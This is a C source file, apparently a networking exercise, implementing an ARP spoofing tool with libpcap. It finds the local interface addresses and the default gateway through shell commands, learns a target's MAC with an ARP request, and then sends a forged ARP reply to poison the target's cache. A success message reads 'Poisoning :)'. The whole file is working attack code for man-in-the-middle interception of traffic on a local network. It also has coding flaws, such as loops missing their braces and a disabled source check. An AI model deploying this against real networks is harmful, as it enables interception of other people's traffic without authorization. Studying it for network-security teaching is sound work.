#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>

#include "arp_spoof.h"

#define ARP_PACKET_LEN sizeof(struct ether_header) + sizeof(struct ether_arp)

void getLocalAddress(u_int8_t * ifname, u_int8_t * get_ip, u_int8_t * get_mac, u_int8_t * get_router)
{

  struct ifreq ifr= {0,};
  int sock=0,i=0; 
  char mac[MAC_ADDR_SIZE]={0,};
  char ip[IP_ADDR_SIZE] = {0,};
  FILE *fp=NULL;  
  char router_ip[IP_ADDR_SIZE] = {0,};
  sock=socket(AF_INET,SOCK_DGRAM,0);

  if (sock < 0) {
    perror("ERROR opening socket\n");
    exit(EXIT_FAILURE);
  }

  strncpy(ifr.ifr_name,ifname,sizeof(ifr.ifr_name));
  ifr.ifr_addr.sa_family = AF_INET; 


  if (ioctl( sock, SIOCGIFHWADDR, &ifr ) < 0) { 
    perror("ERROR opening ioctl mac\n");
    exit(EXIT_FAILURE);
  }


  sprintf(mac, " %02x:%02x:%02x:%02x:%02x:%02x", 
    (u_int8_t)ifr.ifr_hwaddr.sa_data[0],
    (u_int8_t)ifr.ifr_hwaddr.sa_data[1],
    (u_int8_t)ifr.ifr_hwaddr.sa_data[2],
    (u_int8_t)ifr.ifr_hwaddr.sa_data[3],
    (u_int8_t)ifr.ifr_hwaddr.sa_data[4],
    (u_int8_t)ifr.ifr_hwaddr.sa_data[5]);

  memcpy(get_mac,mac,sizeof(mac));

  fp = popen(" /bin/bash -c \"ifconfig eth0\" | grep \'inet \' | awk \'{ print $2}\'", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(EXIT_FAILURE);
  }

//fgets(ip, sizeof(ip), fp);
  while (fgets(ip, sizeof(ip)-1, fp) != NULL)


  for(i =0; i<sizeof(ip)-1;i++)
  {
    if(ip[i]=='\n')
      ip[i]='\0';
  }
  memcpy(get_ip,ip,sizeof(ip));  

  fp = NULL;

  fp = popen(" ip route show | grep -i \'default via\'| awk \'{print $3 }\'", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(EXIT_FAILURE);
  }

  while (fgets(router_ip, sizeof(router_ip) , fp) != NULL)



  for(i =0; i<sizeof (router_ip)-1;i++)
  {
    if(!(( router_ip[i] >= 0x30 && router_ip[i] <=0x39) ||  router_ip[i] == 0x2E ))
      router_ip[i]='\0';
  }
  memcpy(get_router,router_ip,sizeof(router_ip));  

  //printf("Get Local Information \n - Ip\t: %s \n - Mac\t: %s \n - Router \t: %s \n", get_ip, get_mac, get_router);

  pclose(fp);
  close(sock);  

}


void arp_request(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8_t *targetIP, u_int8_t *targetMAC)
{

  pcap_t *handle;
  char packet[ARP_PACKET_LEN];  
  struct ether_header * eth = (struct ether_header *) packet;
  struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
  char errbuf[100] ; 
  struct pcap_pkthdr* header_ptr;
  const u_char *pkt_data;

  u_char mac[MAC_ADDR_SIZE]={0,};
  u_char targetIP_hex[4];

  handle = pcap_open_live(ifname, 65536, 0, 1, errbuf);

  if (handle == NULL) 
  {
    fprintf(stderr, "Cannot open device %s: %s\n", ifname, errbuf);
    exit(EXIT_FAILURE);
  }

  //Target IP : Destination IP Address : ARP Packet
/*  memcpy(targetIP,arp->arp_tpa,sizeof(targetIP));
  memcpy(localMAC,arp->arp_tpa,sizeof(localMAC));
  memcpy(localIP,arp->arp_tpa,sizeof(localIP));*/

  inet_pton(AF_INET, targetIP  , targetIP_hex);  
  inet_pton(AF_INET, targetIP  , arp->arp_tpa); 
 

/*  sscanf(targetIP, "%d.%d.%d.%d", 
    (u_char *) &arp->arp_tpa[0],
    (u_char *) &arp->arp_tpa[1],
    (u_char *) &arp->arp_tpa[2],
    (u_char *) &arp->arp_tpa[3]);*/

  //Source MAC Address : ARP Packet : 
  sscanf(localMAC, "%x:%x:%x:%x:%x:%x",  
    (u_char *) &arp->arp_sha[0],
    (u_char *) &arp->arp_sha[1],
    (u_char *) &arp->arp_sha[2],
    (u_char *) &arp->arp_sha[3],
    (u_char *) &arp->arp_sha[4],    
    (u_char *) &arp->arp_sha[5]);


  //Source IP Address : ARP Packet
  inet_pton(AF_INET, localIP   , arp->arp_spa); 


/*  sscanf(localIP, "%d.%d.%d.%d", 
   (u_char *) &arp->arp_spa[0],
   (u_char *) &arp->arp_spa[1],
   (u_char *) &arp->arp_spa[2],
   (u_char *) &arp->arp_spa[3]);*/

  //Target Mac : Destination Mac Address : ARP Packet   
  memset(arp->arp_tha, 0x00, 6);      

 //Ethernet Packet  
  memset(eth->ether_dhost, 0xff, ETH_ALEN);   //destination address : broadcast address
  memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN); //source address
  eth->ether_type = htons(ETH_P_ARP);                  //type


   //ARP Packet
  arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);            //Format of hardware address
  arp->ea_hdr.ar_pro = htons(ETH_P_IP);                //Format of protocol address.
  arp->ea_hdr.ar_hln = ETH_ALEN;                       //Length of hardware address.
  arp->ea_hdr.ar_pln = 4;                              //Length of protocol address.
  arp->ea_hdr.ar_op = htons(ARPOP_REQUEST);              //ARP operation : REQUEST

 
  if ( pcap_sendpacket(handle, (const u_char *)& packet, sizeof(packet)) == -1) 
  {
    printf("pcap_sendpacket err %s\n", pcap_geterr(handle));      
  } 
  else 
  {
    printf("Send to arp request -> ");
  } 


  while(1)
  {   
    if(pcap_next_ex(handle, &header_ptr, &pkt_data)!=1)
    {
      printf("pcap_sendpacket err %s\n", pcap_geterr(handle));
      continue;     
    }
    else
    {
      printf("Recv Packet : ");
    }

    eth = (struct ether_header*)pkt_data;

    if (ntohs(eth->ether_type) == ETHERTYPE_ARP)
    {
      arp = (struct ether_arp*)(pkt_data + sizeof(struct ether_header));
    }
    else 
    {    
      continue;
    }
    if (ntohs(arp->ea_hdr.ar_pro) != ETHERTYPE_IP) {
      //not IPv4 ARP
      continue;
    }
    if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REPLY)
    {
      printf("ARP REPLY : ");

 /*     printf("\napr->arp_spa: %x, targetIP : %x \n",arp->arp_spa,targetIP_hex);
      printf("\napr->arp_spa: %d.%d.%d.%d \n ",arp->arp_spa[0], arp->arp_spa[1], arp->arp_spa[2], arp->arp_spa[3]);
      printf("\ntargetIP_hex: %d.%d.%d.%d \n ",targetIP_hex[0], targetIP_hex[1], targetIP_hex[2], targetIP_hex[3]);
 */   
      //if(memcmp(arp->arp_spa,targetIP_hex,sizeof(targetIP))==0)
      //{
   
        sprintf(targetMAC, "%02X:%02X:%02X:%02X:%02X:%02X", 
          (u_char)arp->arp_sha[0],
          (u_char)arp->arp_sha[1],
          (u_char)arp->arp_sha[2],
          (u_char)arp->arp_sha[3],
          (u_char)arp->arp_sha[4],
          (u_char)arp->arp_sha[5]);
        break;
      /*}
      else
          continue;  
      }*/
    }else
      continue;      
  }

  printf(" target Mac ADDR : %s\n",targetMAC);
  pcap_close(handle);
}


void arp_spoof(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8_t *Sender_IP, u_int8_t *targetIP, u_int8_t *targetMAC)
{

  pcap_t *handle;
  char packet[ARP_PACKET_LEN];
  char errbuf[100] ;
  struct ether_header * eth = (struct ether_header *) packet;
  struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));

  handle = pcap_open_live(ifname, 65536, 0, 1, errbuf);

  if (handle == NULL) {
    fprintf(stderr, "Cannot open device %s: %s\n", ifname, errbuf);
    exit(EXIT_FAILURE);
  }  


   //Source MAC Address : ARP Packet : 
  sscanf(localMAC, "%x:%x:%x:%x:%x:%x",  
    (u_char *) &arp->arp_sha[0],
    (u_char *) &arp->arp_sha[1],
    (u_char *) &arp->arp_sha[2],
    (u_char *) &arp->arp_sha[3],
    (u_char *) &arp->arp_sha[4],
    (u_char *) &arp->arp_sha[5]);

  //Source IP Address : ARP Packet : Sender IP
  sscanf(Sender_IP, "%d.%d.%d.%d", 
   (u_char *) &arp->arp_spa[0],
   (u_char *) &arp->arp_spa[1],
   (u_char *) &arp->arp_spa[2],
   (u_char *) &arp->arp_spa[3]);

   //Target Mac : Destination Mac Address : ARP Packet 
  sscanf(targetMAC,"%x:%x:%x:%x:%x:%x",
    (u_char *) &arp->arp_tha[0],
    (u_char *) &arp->arp_tha[1],
    (u_char *) &arp->arp_tha[2],
    (u_char *) &arp->arp_tha[3],
    (u_char *) &arp->arp_tha[4],
    (u_char *) &arp->arp_tha[5]);


  //Target IP : Destination IP Address : ARP Packet
  sscanf(targetIP, "%d.%d.%d.%d", 
    (u_char *) &arp->arp_tpa[0],
    (u_char *) &arp->arp_tpa[1],
    (u_char *) &arp->arp_tpa[2],
    (u_char *) &arp->arp_tpa[3]);

 
   //Ethernet Packet  
   memcpy(eth->ether_dhost, arp->arp_tha, ETH_ALEN);    //destination address 
   memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);    //source address
   eth->ether_type = htons(ETH_P_ARP);                  //type


  //ARP Packet
  arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);            //Format of hardware address
  arp->ea_hdr.ar_pro = htons(ETH_P_IP);                //Format of protocol address.
  arp->ea_hdr.ar_hln = ETH_ALEN;                       //Length of hardware address.
  arp->ea_hdr.ar_pln = 4;                              //Length of protocol address.
  arp->ea_hdr.ar_op = htons(ARPOP_REPLY);              //ARP operation : REPLY

  printf(" [*] ARP %s ", targetIP);

  
  if ( pcap_sendpacket(handle, (const u_char *)& packet, sizeof(packet)) == -1) 
  {
    fprintf(stderr, "pcap_sendpacket err %s\n", pcap_geterr(handle));      
  } 
  else 
  {
    printf(" Poisoning :) \n" );
  }  

  pcap_close(handle);
}
